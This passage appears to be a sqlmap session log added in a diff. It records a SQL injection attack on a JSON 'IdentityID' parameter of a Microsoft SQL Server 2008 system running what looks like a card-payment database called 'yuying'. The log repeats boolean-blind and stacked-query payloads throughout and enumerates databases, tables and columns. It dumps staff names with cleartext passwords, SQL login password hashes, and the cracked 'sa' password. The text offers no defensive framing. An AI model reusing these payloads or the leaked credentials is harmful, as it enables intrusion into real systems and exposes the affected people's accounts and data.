+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+[53 tables]
++-------------------------+
+| AccBalan                |
+| AccDeposit              |
+| AddCard                 |
+| Bu_Acco_info            |
+| CardDeposit             |
+| ClientSet               |
+| DayPlan                 |
+| DealCard                |
+| DeptSet                 |
+| FixPrice2               |
+| GetData                 |
+| GroupSet                |
+| Level1                  |
+| LevelRight              |
+| LossCard                |
+| Main                    |
+| Main_Temp               |
+| Main_bak                |
+| ManType                 |
+| Modal1                  |
+| Persons                 |
+| SendData                |
+| SubsidizeRd             |
+| Tbl_Details             |
+| TmpAllCons13            |
+| TmpAllCons14            |
+| TmpAllCons15            |
+| TmpAllCons16            |
+| TmpAllCons17            |
+| TmpAllCons18            |
+| TmpSale                 |
+| UserLogm                |
+| V_Details               |
+| V_PersonInfo            |
+| accperson               |
+| archive                 |
+| autobt                  |
+| constimset              |
+| dayconsume              |
+| dealmoney               |
+| dtproperties            |
+| mealconsume             |
+| oldcardcode             |
+| serverinfo              |
+| sf98Para                |
+| t00                     |
+| tbl_Archive_Log         |
+| tbl_Archive_LogSuc      |
+| tbl_Receive_Log         |
+| tbl_Receive_Log20171021 |
+| temp_ConsumeRecord      |
+| tmpconsume              |
+| userdept                |
++-------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Main
+[13 entries]
++---------+
+| AddCard |
++---------+
+| <blank> |
+| <blank> |
+| <blank> |
+| <blank> |
+| <blank> |
+| <blank> |
+| <blank> |
+| <blank> |
+| <blank> |
+| <blank> |
+| <blank> |
+| <blank> |
+| <blank> |
++---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Main
+[27 columns]
++---------------+----------+
+| Column        | Type     |
++---------------+----------+
+| Allowance     | money    |
+| AllowMark     | nvarchar |
+| CardCode      | nvarchar |
+| CardType      | nvarchar |
+| ConsDate      | nvarchar |
+| ConsRight     | nvarchar |
+| dayconsflag   | nvarchar |
+| Deposit       | money    |
+| depositflag   | nvarchar |
+| Gbf           | money    |
+| ID            | nvarchar |
+| IdentityID    | nvarchar |
+| IdentityNo    | nvarchar |
+| Manage        | smallint |
+| MaxCons       | real     |
+| Money0        | money    |
+| monthconsflag | nvarchar |
+| Name          | nvarchar |
+| OpenDate      | nvarchar |
+| PassW         | nvarchar |
+| PersonType    | nvarchar |
+| PS_ID         | nvarchar |
+| Sex           | nvarchar |
+| sn            | char     |
+| State         | nvarchar |
+| timelimit     | nvarchar |
+| userdept      | nvarchar |
++---------------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+[53 tables]
++-------------------------+
+| AccBalan                |
+| AccDeposit              |
+| AddCard                 |
+| Bu_Acco_info            |
+| CardDeposit             |
+| ClientSet               |
+| DayPlan                 |
+| DealCard                |
+| DeptSet                 |
+| FixPrice2               |
+| GetData                 |
+| GroupSet                |
+| Level1                  |
+| LevelRight              |
+| LossCard                |
+| Main                    |
+| Main_Temp               |
+| Main_bak                |
+| ManType                 |
+| Modal1                  |
+| Persons                 |
+| SendData                |
+| SubsidizeRd             |
+| Tbl_Details             |
+| TmpAllCons13            |
+| TmpAllCons14            |
+| TmpAllCons15            |
+| TmpAllCons16            |
+| TmpAllCons17            |
+| TmpAllCons18            |
+| TmpSale                 |
+| UserLogm                |
+| V_Details               |
+| V_PersonInfo            |
+| accperson               |
+| archive                 |
+| autobt                  |
+| constimset              |
+| dayconsume              |
+| dealmoney               |
+| dtproperties            |
+| mealconsume             |
+| oldcardcode             |
+| serverinfo              |
+| sf98Para                |
+| t00                     |
+| tbl_Archive_Log         |
+| tbl_Archive_LogSuc      |
+| tbl_Receive_Log         |
+| tbl_Receive_Log20171021 |
+| temp_ConsumeRecord      |
+| tmpconsume              |
+| userdept                |
++-------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: AddCard
+[5 columns]
++----------+----------+
+| Column   | Type     |
++----------+----------+
+| CardCode | nvarchar |
+| ClientNO | nvarchar |
+| ID       | nvarchar |
+| Name     | nvarchar |
+| PassWord | nvarchar |
++----------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+[53 tables]
++-------------------------+
+| AccBalan                |
+| AccDeposit              |
+| AddCard                 |
+| Bu_Acco_info            |
+| CardDeposit             |
+| ClientSet               |
+| DayPlan                 |
+| DealCard                |
+| DeptSet                 |
+| FixPrice2               |
+| GetData                 |
+| GroupSet                |
+| Level1                  |
+| LevelRight              |
+| LossCard                |
+| Main                    |
+| Main_Temp               |
+| Main_bak                |
+| ManType                 |
+| Modal1                  |
+| Persons                 |
+| SendData                |
+| SubsidizeRd             |
+| Tbl_Details             |
+| TmpAllCons13            |
+| TmpAllCons14            |
+| TmpAllCons15            |
+| TmpAllCons16            |
+| TmpAllCons17            |
+| TmpAllCons18            |
+| TmpSale                 |
+| UserLogm                |
+| V_Details               |
+| V_PersonInfo            |
+| accperson               |
+| archive                 |
+| autobt                  |
+| constimset              |
+| dayconsume              |
+| dealmoney               |
+| dtproperties            |
+| mealconsume             |
+| oldcardcode             |
+| serverinfo              |
+| sf98Para                |
+| t00                     |
+| tbl_Archive_Log         |
+| tbl_Archive_LogSuc      |
+| tbl_Receive_Log         |
+| tbl_Receive_Log20171021 |
+| temp_ConsumeRecord      |
+| tmpconsume              |
+| userdept                |
++-------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Persons
+[4 columns]
++-----------+----------+
+| Column    | Type     |
++-----------+----------+
+| ID        | nvarchar |
+| LevelCode | nvarchar |
+| Name      | nvarchar |
+| Password  | nvarchar |
++-----------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Persons
+[3 entries]
++-------+
+| Name  |
++-------+
+| 系统管理员 |
+| 刘彦飞   |
+| 统计员   |
++-------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Persons
+[3 entries]
++-------+----------+
+| Name  | Password |
++-------+----------+
+| 系统管理员 | postek   |
+| 刘彦飞   | 192064   |
+| 统计员   | 000000   |
++-------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+[53 tables]
++-------------------------+
+| AccBalan                |
+| AccDeposit              |
+| AddCard                 |
+| Bu_Acco_info            |
+| CardDeposit             |
+| ClientSet               |
+| DayPlan                 |
+| DealCard                |
+| DeptSet                 |
+| FixPrice2               |
+| GetData                 |
+| GroupSet                |
+| Level1                  |
+| LevelRight              |
+| LossCard                |
+| Main                    |
+| Main_Temp               |
+| Main_bak                |
+| ManType                 |
+| Modal1                  |
+| Persons                 |
+| SendData                |
+| SubsidizeRd             |
+| Tbl_Details             |
+| TmpAllCons13            |
+| TmpAllCons14            |
+| TmpAllCons15            |
+| TmpAllCons16            |
+| TmpAllCons17            |
+| TmpAllCons18            |
+| TmpSale                 |
+| UserLogm                |
+| V_Details               |
+| V_PersonInfo            |
+| accperson               |
+| archive                 |
+| autobt                  |
+| constimset              |
+| dayconsume              |
+| dealmoney               |
+| dtproperties            |
+| mealconsume             |
+| oldcardcode             |
+| serverinfo              |
+| sf98Para                |
+| t00                     |
+| tbl_Archive_Log         |
+| tbl_Archive_LogSuc      |
+| tbl_Receive_Log         |
+| tbl_Receive_Log20171021 |
+| temp_ConsumeRecord      |
+| tmpconsume              |
+| userdept                |
++-------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: ClientSet
+[15 columns]
++------------+----------+
+| Column     | Type     |
++------------+----------+
+| ClientNo   | nvarchar |
+| ClientType | nvarchar |
+| FixPrice   | money    |
+| FixPrice2  | money    |
+| Operatoer  | nvarchar |
+| Price      | nvarchar |
+| Price1     | money    |
+| Price2     | money    |
+| Price3     | money    |
+| Price4     | money    |
+| SetPara    | nvarchar |
+| ToDept     | nvarchar |
+| ToGateWay  | nvarchar |
+| ToGroup    | nvarchar |
+| WaterType  | nvarchar |
++------------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+[53 tables]
++-------------------------+
+| AccBalan                |
+| AccDeposit              |
+| AddCard                 |
+| Bu_Acco_info            |
+| CardDeposit             |
+| ClientSet               |
+| DayPlan                 |
+| DealCard                |
+| DeptSet                 |
+| FixPrice2               |
+| GetData                 |
+| GroupSet                |
+| Level1                  |
+| LevelRight              |
+| LossCard                |
+| Main                    |
+| Main_Temp               |
+| Main_bak                |
+| ManType                 |
+| Modal1                  |
+| Persons                 |
+| SendData                |
+| SubsidizeRd             |
+| Tbl_Details             |
+| TmpAllCons13            |
+| TmpAllCons14            |
+| TmpAllCons15            |
+| TmpAllCons16            |
+| TmpAllCons17            |
+| TmpAllCons18            |
+| TmpSale                 |
+| UserLogm                |
+| V_Details               |
+| V_PersonInfo            |
+| accperson               |
+| archive                 |
+| autobt                  |
+| constimset              |
+| dayconsume              |
+| dealmoney               |
+| dtproperties            |
+| mealconsume             |
+| oldcardcode             |
+| serverinfo              |
+| sf98Para                |
+| t00                     |
+| tbl_Archive_Log         |
+| tbl_Archive_LogSuc      |
+| tbl_Receive_Log         |
+| tbl_Receive_Log20171021 |
+| temp_ConsumeRecord      |
+| tmpconsume              |
+| userdept                |
++-------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+[53 tables]
++-------------------------+
+| AccBalan                |
+| AccDeposit              |
+| AddCard                 |
+| Bu_Acco_info            |
+| CardDeposit             |
+| ClientSet               |
+| DayPlan                 |
+| DealCard                |
+| DeptSet                 |
+| FixPrice2               |
+| GetData                 |
+| GroupSet                |
+| Level1                  |
+| LevelRight              |
+| LossCard                |
+| Main                    |
+| Main_Temp               |
+| Main_bak                |
+| ManType                 |
+| Modal1                  |
+| Persons                 |
+| SendData                |
+| SubsidizeRd             |
+| Tbl_Details             |
+| TmpAllCons13            |
+| TmpAllCons14            |
+| TmpAllCons15            |
+| TmpAllCons16            |
+| TmpAllCons17            |
+| TmpAllCons18            |
+| TmpSale                 |
+| UserLogm                |
+| V_Details               |
+| V_PersonInfo            |
+| accperson               |
+| archive                 |
+| autobt                  |
+| constimset              |
+| dayconsume              |
+| dealmoney               |
+| dtproperties            |
+| mealconsume             |
+| oldcardcode             |
+| serverinfo              |
+| sf98Para                |
+| t00                     |
+| tbl_Archive_Log         |
+| tbl_Archive_LogSuc      |
+| tbl_Receive_Log         |
+| tbl_Receive_Log20171021 |
+| temp_ConsumeRecord      |
+| tmpconsume              |
+| userdept                |
++-------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: Persons
+[4 columns]
++-----------+----------+
+| Column    | Type     |
++-----------+----------+
+| ID        | nvarchar |
+| LevelCode | nvarchar |
+| Name      | nvarchar |
+| Password  | nvarchar |
++-----------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+available databases [7]:
+[*] master
+[*] model
+[*] msdb
+[*] ReportServer
+[*] ReportServerTempDB
+[*] tempdb
+[*] yuying
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: ReportServer
+Table: ConfigurationInfo
+[3 columns]
++--------------+------------------+
+| Column       | Type             |
++--------------+------------------+
+| ConfigInfoID | uniqueidentifier |
+| Name         | nvarchar         |
+| Value        | ntext            |
++--------------+------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: ReportServer
+Table: ConfigurationInfo
+[2 entries]
++------------------------+
+| Name                   |
++------------------------+
+| ReportBuilderLaunchURL |
+| SharePointIntegrated   |
++------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: ReportServer
+Table: ConfigurationInfo
+[6 entries]
++----------------------------+-------+
+| Name                       | Value |
++----------------------------+-------+
+| ReportBuilderLaunchURL     | 5     |
+| SharePointIntegrated       | 7200  |
+| UseSessionCookies          | True  |
+| EnableRemoteErrors         | True  |
+| SystemSnapshotLimit        | true  |
+| EnableLoadReportDefinition | True  |
++----------------------------+-------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+available databases [7]:
+[*] master
+[*] model
+[*] msdb
+[*] ReportServer
+[*] ReportServerTempDB
+[*] tempdb
+[*] yuying
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+[53 tables]
++-------------------------+
+| AccBalan                |
+| AccDeposit              |
+| AddCard                 |
+| Bu_Acco_info            |
+| CardDeposit             |
+| ClientSet               |
+| DayPlan                 |
+| DealCard                |
+| DeptSet                 |
+| FixPrice2               |
+| GetData                 |
+| GroupSet                |
+| Level1                  |
+| LevelRight              |
+| LossCard                |
+| Main                    |
+| Main_Temp               |
+| Main_bak                |
+| ManType                 |
+| Modal1                  |
+| Persons                 |
+| SendData                |
+| SubsidizeRd             |
+| Tbl_Details             |
+| TmpAllCons13            |
+| TmpAllCons14            |
+| TmpAllCons15            |
+| TmpAllCons16            |
+| TmpAllCons17            |
+| TmpAllCons18            |
+| TmpSale                 |
+| UserLogm                |
+| V_Details               |
+| V_PersonInfo            |
+| accperson               |
+| archive                 |
+| autobt                  |
+| constimset              |
+| dayconsume              |
+| dealmoney               |
+| dtproperties            |
+| mealconsume             |
+| oldcardcode             |
+| serverinfo              |
+| sf98Para                |
+| t00                     |
+| tbl_Archive_Log         |
+| tbl_Archive_LogSuc      |
+| tbl_Receive_Log         |
+| tbl_Receive_Log20171021 |
+| temp_ConsumeRecord      |
+| tmpconsume              |
+| userdept                |
++-------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+database management system users [3]:
+[*] ##MS_PolicyEventProcessingLogin##
+[*] ##MS_PolicyTsqlExecutionLogin##
+[*] sa
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+database management system users password hashes:
+[*] ##MS_PolicyEventProcessingLogin## [1]:
+    password hash: 0x0100c3e13365d8f444aa05f77309d9a9c97a2ca379017e8fe016
+        header: 0x0100
+        salt: c3e13365
+        mixedcase: d8f444aa05f77309d9a9c97a2ca379017e8fe016
+
+[*] ##MS_PolicyTsqlExecutionLogin## [1]:
+    password hash: 0x0100ab62875da96cde7ccca6beebb65ba606df206e0fdd449cbd
+        header: 0x0100
+        salt: ab62875d
+        mixedcase: a96cde7ccca6beebb65ba606df206e0fdd449cbd
+
+[*] sa [1]:
+    password hash: 0x01003c56207c44db138ac5a360606d1d19222b6e848c029c5b36
+        header: 0x0100
+        salt: 3c56207c
+        mixedcase: 44db138ac5a360606d1d19222b6e848c029c5b36
+    clear-text password: sasa
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+[53 tables]
++-------------------------+
+| AccBalan                |
+| AccDeposit              |
+| AddCard                 |
+| Bu_Acco_info            |
+| CardDeposit             |
+| ClientSet               |
+| DayPlan                 |
+| DealCard                |
+| DeptSet                 |
+| FixPrice2               |
+| GetData                 |
+| GroupSet                |
+| Level1                  |
+| LevelRight              |
+| LossCard                |
+| Main                    |
+| Main_Temp               |
+| Main_bak                |
+| ManType                 |
+| Modal1                  |
+| Persons                 |
+| SendData                |
+| SubsidizeRd             |
+| Tbl_Details             |
+| TmpAllCons13            |
+| TmpAllCons14            |
+| TmpAllCons15            |
+| TmpAllCons16            |
+| TmpAllCons17            |
+| TmpAllCons18            |
+| TmpSale                 |
+| UserLogm                |
+| V_Details               |
+| V_PersonInfo            |
+| accperson               |
+| archive                 |
+| autobt                  |
+| constimset              |
+| dayconsume              |
+| dealmoney               |
+| dtproperties            |
+| mealconsume             |
+| oldcardcode             |
+| serverinfo              |
+| sf98Para                |
+| t00                     |
+| tbl_Archive_Log         |
+| tbl_Archive_LogSuc      |
+| tbl_Receive_Log         |
+| tbl_Receive_Log20171021 |
+| temp_ConsumeRecord      |
+| tmpconsume              |
+| userdept                |
++-------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: CardDeposit
+[8 columns]
++-----------+------------+
+| Column    | Type       |
++-----------+------------+
+| cardcode  | char       |
+| cardid    | nvarchar   |
+| dealdate  | nvarchar   |
+| deposit   | smallmoney |
+| localflag | char       |
+| person    | nvarchar   |
+| state     | char       |
+| zipcode   | char       |
++-----------+------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+[53 tables]
++-------------------------+
+| AccBalan                |
+| AccDeposit              |
+| AddCard                 |
+| Bu_Acco_info            |
+| CardDeposit             |
+| ClientSet               |
+| DayPlan                 |
+| DealCard                |
+| DeptSet                 |
+| FixPrice2               |
+| GetData                 |
+| GroupSet                |
+| Level1                  |
+| LevelRight              |
